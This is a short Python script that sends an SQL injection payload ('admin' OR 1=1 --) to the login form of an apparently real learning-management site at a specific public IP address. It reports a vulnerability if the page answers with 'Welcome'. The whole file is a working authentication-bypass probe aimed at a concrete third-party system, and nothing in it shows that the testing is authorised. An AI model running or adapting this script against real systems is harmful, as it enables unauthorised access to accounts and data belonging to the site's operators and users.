import requests

url = "http://118.107.134.251/uobs-lms//login"  
payload = {"username": "admin' OR 1=1 --", "password": "password"}
response = requests.post(url, data=payload)

if "Welcome" in response.text:
    print("Possible SQL Injection Vulnerability!")
else:
    print("No vulnerability detected.")
